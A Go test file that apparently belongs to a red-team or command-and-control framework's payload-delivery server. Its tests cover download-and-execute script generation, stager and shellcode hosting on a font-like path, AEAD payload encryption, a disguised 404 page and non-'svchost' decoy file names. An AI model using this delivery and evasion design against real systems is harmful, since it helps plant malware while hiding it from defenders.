package delivery

import (
	"bytes"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"BackendTemplate/pkg/database"
)

// TestReserveHitHonorsMaxUnderConcurrency MaxDownloads 必须是并发硬闸门：
// 旧实现先比较 p.Meta.HitCount 再自增，并发下能突破上限且产生数据竞争。
func TestReserveHitHonorsMaxUnderConcurrency(t *testing.T) {
	p := &Profile{Meta: database.WebDelivery{MaxDownloads: 2}}

	const workers = 32
	var wg sync.WaitGroup
	var granted int32
	wg.Add(workers)
	for i := 0; i < workers; i++ {
		go func() {
			defer wg.Done()
			if p.reserveHit() {
				atomic.AddInt32(&granted, 1)
			}
		}()
	}
	wg.Wait()
	if granted != 2 {
		t.Fatalf("MaxDownloads=2 时应只放行 2 个请求，实际 %d", granted)
	}
	if got := atomic.LoadInt64(&p.hits); got != 2 {
		t.Fatalf("命中计数应为 2，实际 %d", got)
	}

	// 归还一个名额后应能再放行一个
	p.releaseHit()
	if !p.reserveHit() {
		t.Fatal("归还名额后应允许再次下载")
	}
	if p.reserveHit() {
		t.Fatal("再次占满后不应继续放行")
	}
}

// TestConsumeOneTimeIsAtomicAndPerResource 一次性消费必须 CAS，且 full/stager/sc 各自独立。
func TestConsumeOneTimeIsAtomicAndPerResource(t *testing.T) {
	p := &Profile{}
	if !p.consumeOneTime("full_used") {
		t.Fatal("首次消费 full 应成功")
	}
	if p.consumeOneTime("full_used") {
		t.Fatal("第二次消费 full 应失败")
	}
	if !p.consumeOneTime("stager_used") {
		t.Fatal("stager 与 full 应互相独立")
	}
	if p.consumeOneTime("sc_used") != true {
		t.Fatal("sc 首次消费应成功")
	}
	if p.consumeOneTime("bogus") {
		t.Fatal("未知列名不应消费成功")
	}
}

// TestGenerateScriptWithTokenUsesHeader 令牌不能进 URL；脚本应通过请求头携带。
func TestGenerateScriptWithTokenUsesHeader(t *testing.T) {
	url := "https://cdn.example.com/d/abc/full/svchost.exe"
	cases := []struct {
		kind string
		want string
	}{
		{"ps1", "X-Delivery-Token"},
		{"bat", "X-Delivery-Token"},
		{"vbs", "setRequestHeader"},
		{"hta", "setRequestHeader"},
		{"lnk", "X-Delivery-Token"},
		{"sh", "X-Delivery-Token"},
	}
	for _, tc := range cases {
		out := string(GenerateScriptWithToken(tc.kind, ScriptModeURL, url, "/tmp", "x", "", "tok123", nil))
		if !strings.Contains(out, tc.want) {
			t.Errorf("%s 脚本应携带令牌头 %q：%s", tc.kind, tc.want, out)
		}
		if strings.Contains(out, "?t=") {
			t.Errorf("%s 脚本不应把令牌拼进 URL：%s", tc.kind, out)
		}
	}
}

// TestGenerateCommandsPrefersHeader 支持自定义头的命令用 Header；certutil/bitsadmin
// 这类无法加头的工具只能回退 query token。
func TestGenerateCommandsPrefersHeader(t *testing.T) {
	items := GenerateCommands(CommandOptions{
		FullURL:      "https://cdn.example.com/d/abc/full/svchost.exe",
		StagerURL:    "https://cdn.example.com/d/abc/stager",
		ShellcodeURL: "https://cdn.example.com/d/abc/woff",
		OS:           "windows",
		AccessToken:  "tok123",
	})
	for _, it := range items {
		switch it.Name {
		case "PowerShell 下载执行", "curl.exe 下载执行", "Stager PowerShell", "PowerShell 拉取 shellcode 到变量":
			if !strings.Contains(it.Code, "X-Delivery-Token") {
				t.Errorf("%s 应使用 Header 携带令牌：%s", it.Name, it.Code)
			}
			if strings.Contains(it.Code, "?t=") {
				t.Errorf("%s 不应把令牌拼进 URL：%s", it.Name, it.Code)
			}
		case "certutil 下载执行", "bitsadmin 下载":
			if !strings.Contains(it.Code, "?t=tok123") {
				t.Errorf("%s 无法加 Header，应回退 query token：%s", it.Name, it.Code)
			}
		}
	}
}

// TestResourceSegmentsAndRandomName 资源段名与默认文件名不再写死系统进程名。
func TestResourceSegmentsAndRandomName(t *testing.T) {
	n := ResourceNames()
	if n.Full != "full" || n.Stager != "stager" || n.Sc != "sc" || n.Woff != "woff" {
		t.Fatalf("默认资源段名不正确: %+v", n)
	}
	meta := database.WebDelivery{
		PublicKey:  "abc123",
		FileName:   "x.exe",
		OS:         "windows",
		BindMode:   "shared",
		PublicHost: "example.com",
	}
	BuildPublicURLs(&meta, 8080)
	if !strings.Contains(meta.ServerAddress, "/"+n.Full+"/x.exe") ||
		!strings.Contains(meta.StagerURL, "/"+n.Stager) ||
		!strings.Contains(meta.ShellcodeURL, "/"+n.Woff) {
		t.Fatalf("URL 未使用资源段名: full=%s stager=%s sc=%s", meta.ServerAddress, meta.StagerURL, meta.ShellcodeURL)
	}

	name := RandomFileName("windows", "exe", "abcdef123456")
	if name != "update_abcdef.exe" {
		t.Fatalf("随机默认文件名不符合预期: %s", name)
	}
	if strings.Contains(strings.ToLower(name), "svchost") {
		t.Fatal("默认文件名不应使用 svchost")
	}
}

// TestWriteNotFoundCamouflage 404 不能暴露 Go 默认纯文本指纹。
func TestWriteNotFoundCamouflage(t *testing.T) {
	rec := httptest.NewRecorder()
	req := httptest.NewRequest("GET", "/d/nope/full", nil)
	writeNotFound(rec, req)
	if rec.Code != 404 {
		t.Fatalf("状态码应为 404，实际 %d", rec.Code)
	}
	body := rec.Body.String()
	if strings.Contains(body, "404 page not found") {
		t.Fatalf("不应返回 Go 默认 404 文案: %s", body)
	}
	if !strings.Contains(strings.ToLower(rec.Header().Get("Content-Type")), "text/html") {
		t.Fatalf("应返回 HTML 伪装页，实际 Content-Type=%s", rec.Header().Get("Content-Type"))
	}
}

// TestHubAEADEncryptsFullOnly AEAD 只加密 full；stager 必须保持可执行。
func TestHubAEADEncryptsFullOnly(t *testing.T) {
	key, err := NewAEADKey()
	if err != nil {
		t.Fatal(err)
	}
	plain := []byte("MZ-full-payload")
	stager := []byte("MZ-stager")
	sc := []byte("shellcode-bytes")
	meta := database.WebDelivery{
		PublicKey:   "k1",
		Status:      1,
		CryptoMode:  "aead",
		DeliveryKey: key,
		FileName:    "x.exe",
		OS:          "windows",
		ContentType: "application/octet-stream",
	}
	h := NewHub()
	h.Register(meta, Payload{Full: plain, Stager: stager, Shellcode: sc})

	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest("GET", "/d/k1/full/x.exe", nil))
	if rec.Code != 200 {
		t.Fatalf("full 应返回 200，实际 %d", rec.Code)
	}
	dec, err := AEADDecrypt(rec.Body.Bytes(), key)
	if err != nil {
		t.Fatalf("full 响应应为可解密 AEAD 密文: %v", err)
	}
	if !bytes.Equal(dec, plain) {
		t.Fatalf("解密结果不一致: %q", dec)
	}

	rec = httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest("GET", "/d/k1/stager", nil))
	if rec.Code != 200 {
		t.Fatalf("stager 应返回 200，实际 %d", rec.Code)
	}
	if !bytes.Equal(rec.Body.Bytes(), stager) {
		t.Fatal("stager 不应被 AEAD 加密（否则无法执行）")
	}

	rec = httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest("GET", "/d/k1/woff", nil))
	if rec.Code != 200 {
		t.Fatalf("woff 应返回 200，实际 %d", rec.Code)
	}
	dec, err = AEADDecrypt(rec.Body.Bytes(), key)
	if err != nil {
		t.Fatalf("woff 响应应为可解密 AEAD 密文: %v", err)
	}
	if !bytes.Equal(dec, sc) {
		t.Fatalf("woff 解密结果不一致: %q", dec)
	}
}
